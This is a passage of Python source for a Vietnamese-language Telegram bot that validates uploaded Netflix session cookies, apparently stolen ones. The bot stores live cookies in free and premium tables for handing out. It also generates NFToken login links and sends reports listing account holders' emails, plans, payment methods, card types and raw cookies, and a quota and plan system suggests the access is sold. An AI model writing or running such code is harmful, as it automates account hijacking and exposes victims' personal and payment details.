                        continue

                    try:
                        worker_checker = NetflixTokenChecker()
                        success, token, error, account = await asyncio.wait_for(
                            asyncio.to_thread(worker_checker.check_cookie, cookie_dict),
                            timeout=REQUEST_TIMEOUT,
                        )
                        if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                            valid_cookies_to_insert.append(checker.build_netscape_format(cookie_dict))
                            live_count += 1
                        else:
                            dead_count += 1
                    except Exception:
                        dead_count += 1

                    processed_count += 1
                    queue.task_done()

            workers = [asyncio.create_task(admin_worker()) for _ in range(15)]
            last_update = time.time()

            while not queue.empty() or processed_count < total_len:
                await asyncio.sleep(1)
                if active_tasks.get(chat_id, False): break
                if time.time() - last_update >= 2:
                    try:
                        await status_msg.edit_text(
                            f"🔍 *Đang Lọc Cookie Siêu Tốc...*\n\n"
                            f"  📋 Tiến độ: *{processed_count}* / *{total_len}* ({round(processed_count/total_len*100)}%)\n"
                            f"  ✅ Cookie Chuẩn (Đang chờ nạp): *{live_count}*\n"
                            f"  ❌ Hết Hạn / Lỗi: *{dead_count}*",
                            parse_mode='Markdown', reply_markup=kb_cancel()
                        )
                    except: pass
                    last_update = time.time()

            try: await asyncio.wait_for(queue.join(), timeout=30)
            except asyncio.TimeoutError: pass
            for w in workers: w.cancel()

            if valid_cookies_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    if is_vip:
                        c.executemany("INSERT INTO premium_cookies (data) VALUES (?)", [(ck,) for ck in valid_cookies_to_insert])
                    else:
                        c.executemany("INSERT INTO free_cookies (data) VALUES (?)", [(ck,) for ck in valid_cookies_to_insert])
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Batch Insert Error: {e}")

            active_tasks.pop(chat_id, None)

            await status_msg.edit_text(f"✅ *LỌC & NẠP HOÀN TẤT*\n\n📦 Tổng quét: *{total_len}*\n✅ Cookie sống chuẩn (Đã nạp kho {target_name}): *{live_count}*\n❌ Bỏ qua (Die/Hết hạn): *{dead_count}*", parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            return

        tokens_used, tokens_max, _, _, _ = get_user_quota(user_id)
        remaining = tokens_max - tokens_used
        if len(all_cookies) > remaining and user_id != ADMIN_ID:
            await status_msg.edit_text(f"❌ File chứa *{len(all_cookies)}* cookie, nhưng bạn chỉ còn lại *{remaining}* lượt tạo link hôm nay.\n\nVui lòng nâng cấp gói hoặc giảm bớt số lượng cookie trong file.", parse_mode='Markdown', reply_markup=kb_done())
            return

        await status_msg.edit_text(progress_bar(0, len(all_cookies), 0), parse_mode='Markdown', reply_markup=kb_cancel())

        results, success_count, processed_count, total_len = [], 0, 0, len(all_cookies)
        queue = asyncio.Queue()
        for i, cookie_dict in enumerate(all_cookies, 1): queue.put_nowait((i, cookie_dict))

        async def user_worker():
            nonlocal success_count, processed_count
            while True:
                try: item = queue.get_nowait()
                except asyncio.QueueEmpty: break
                i, cookie_dict = item
                if active_tasks.get(chat_id, False) or get_user_quota(user_id)[0] >= get_user_quota(user_id)[1]:
                    queue.task_done()
                    continue
                try:
                    worker_checker = NetflixTokenChecker()
                    success, token, error, account = await asyncio.wait_for(
                        asyncio.to_thread(worker_checker.check_cookie, cookie_dict),
                        timeout=REQUEST_TIMEOUT,
                    )
                except asyncio.TimeoutError:
                    success, token, error, account = False, None, 'Hết thời gian kiểm tra', {}
                except Exception as e:
                    success, token, error, account = False, None, str(e), {}

                if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                    results.append({'cookies': cookie_dict, 'token': token, 'link': checker.format_nftoken_link(token), 'account': account})
                    success_count += 1
                processed_count += 1
                queue.task_done()

        workers = [asyncio.create_task(user_worker()) for _ in range(15)]
        start_time, last_update, stall_count, last_processed = time.time(), time.time(), 0, 0

        while not queue.empty() or processed_count < total_len:
            await asyncio.sleep(1)
            if time.time() - start_time > 300: break
            if processed_count == last_processed: stall_count += 1
            else: stall_count, last_processed = 0, processed_count
            if stall_count >= 30 or active_tasks.get(chat_id, False): break
            if time.time() - last_update >= 3:
                try: await status_msg.edit_text(progress_bar(processed_count, total_len, success_count), parse_mode='Markdown', reply_markup=kb_cancel())
                except Exception: pass
                last_update = time.time()

        try: await asyncio.wait_for(queue.join(), timeout=30)
        except asyncio.TimeoutError: pass
        for w in workers: w.cancel()

        if success_count > 0:
            add_token_usage(user_id, success_count)

        active_tasks.pop(chat_id, None)
        update_stats(user_id, total=processed_count, success=success_count)

        out_of_quota = get_user_quota(user_id)[0] >= get_user_quota(user_id)[1]
        banner_text = banner_batch_done(success_count, total_len)
        if out_of_quota: banner_text += f"\n\n⚠️ *Đã dừng do hết lượt tạo link ({get_user_quota(user_id)[1]}/{get_user_quota(user_id)[1]})*"
        await status_msg.edit_text(banner_text, parse_mode='Markdown')

        if results:
            content_lines = [f"════════════════════════════════════════\n BÁO CÁO KẾT QUẢ TẠO NFTOKEN\n Cung cấp bởi {BOT_NAME} v{BOT_VERSION}\n Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n Tổng quét: {processed_count} | Thành công: {success_count}\n════════════════════════════════════════\n"]
            for i, res in enumerate(results, 1):
                acc = res['account']
                content_lines.extend([f"[{i}] TÀI KHOẢN", f"Email: {acc.get('email', 'N/A')}", f"Gói cước: {acc.get('plan', 'N/A')} - {acc.get('country', 'N/A')}", f"Thanh toán: {acc.get('payment_method', 'N/A')} - {acc.get('cc_type', 'N/A')}", f"NFToken: {res['token']}", f"Login Link: {res['link']}", f"\nNetscape Cookie:\n{checker.build_netscape_format(res['cookies'])}", f"\n{'='*40}\n"])
            fname = f"Results_{success_count}_NFToken_{datetime.now().strftime('%H%M%S')}.txt"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO("\n".join(content_lines).encode('utf-8')), filename=fname, caption=f"🎉 Đã quét xong! Có {success_count} account hoạt động.\nFile tổng hợp đính kèm bên dưới 👇")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Không có cookie nào hoạt động.\n\n  {FOOTER}", parse_mode='Markdown')
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⬇️", reply_markup=kb_done())

    except Exception as e:
        logger.error(f"Batch error: {e}")
        await status_msg.edit_text(f"❌ *Lỗi xử lý file*\n\n  `{str(e)[:80]}`\n\n  {FOOTER}", parse_mode='Markdown')
        active_tasks.pop(chat_id, None)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update and update.effective_user else None
    chat_id = update.effective_chat.id if update and update.effective_chat else None
    logger.error(
        "Unhandled Telegram update error user_id=%s chat_id=%s update_id=%s",
        user_id,
        chat_id,
        getattr(update, 'update_id', None),
        exc_info=(type(context.error), context.error, context.error.__traceback__),
    )

def main():
    print(f"[{BOT_NAME}] Đang khởi động...", flush=True)
    token = configure_bot_token()
    print(f"[{BOT_NAME}] Đang mở cơ sở dữ liệu...", flush=True)
    init_db()
    application = (
        Application.builder()
        .token(token)
        .post_init(configure_miniapp_menu)
        .concurrent_updates(16)
        .connect_timeout(15)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(15)
        .build()
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("app", cmd_app))
    application.add_handler(CommandHandler("me", cmd_me))
    application.add_handler(CommandHandler("giftcode", cmd_giftcode))
    application.add_handler(CommandHandler("freecookie", cmd_freecookie))
    application.add_handler(CommandHandler("baoloi", cmd_baoloi))

    application.add_handler(CommandHandler("admin", cmd_admin))
    application.add_handler(CommandHandler("setplan", cmd_setplan))
    application.add_handler(CommandHandler("addplan", cmd_addplan))
    application.add_handler(CommandHandler("addcookie", cmd_addcookie))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))

    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler((filters.TEXT | filters.PHOTO) & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    application.add_error_handler(error_handler)

    import sys
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    print(f"[{BOT_NAME}] Đang kết nối Telegram (v{BOT_VERSION})...", flush=True)
    application.run_polling(
        bootstrap_retries=3,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
    )

if __name__ == '__main__':
    main()
